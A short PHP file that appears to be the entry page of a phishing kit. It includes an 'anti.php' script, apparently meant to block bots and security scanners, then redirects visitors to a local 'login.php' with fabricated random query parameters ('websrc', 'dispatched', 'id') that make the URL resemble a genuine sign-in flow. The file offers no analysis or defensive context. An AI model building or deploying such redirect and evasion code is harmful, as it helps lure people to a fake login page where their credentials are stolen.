<?php

include('./anti.php');

header("location:./login.php?websrc=".md5('X-moustache')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");

?>